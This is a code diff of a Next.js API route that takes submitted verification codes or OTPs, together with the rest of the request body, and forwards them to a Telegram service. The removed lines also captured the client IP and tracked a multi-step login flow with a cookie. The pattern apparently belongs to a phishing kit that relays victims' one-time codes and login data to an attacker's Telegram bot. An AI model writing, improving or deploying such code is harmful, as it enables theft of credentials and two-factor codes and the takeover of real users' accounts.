@@ -1,28 +1,25 @@
 import { NextRequest, NextResponse } from "next/server"
 import { telegramService } from "@/lib/telegram"
-import { getClientIp } from "@/lib/request-ip"
-
-const LOGIN_FLOW_COOKIE = "login_flow"
 
 export async function POST(request: NextRequest) {
   try {
-    const data = await request.json()
-    const ip = getClientIp(request)
-    await telegramService.sendVerificationNotification({ ...data, ip })
-    const response = NextResponse.json({ success: true })
-
-    
-    if (data.verificationType !== "Code (final)") {
-      response.cookies.set(LOGIN_FLOW_COOKIE, "2", {
-        path: "/",
-        maxAge: 10 * 60,
-      })
-    }
-
-    return response
+    const body = await request.json()
+    const code =
+      (typeof body.code === "string" && body.code) ||
+      (typeof body.otp === "string" && body.otp) ||
+      ""
+    const verificationType =
+      (typeof body.verificationType === "string" && body.verificationType) ||
+      (typeof body.method === "string" && body.method) ||
+      undefined
+    await telegramService.sendVerificationNotification({
+      ...body,
+      code,
+      verificationType,
+    })
+    return NextResponse.json({ success: true })
   } catch (error) {
     console.error("Error sending verification notification:", error)
     return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
   }
 }
-
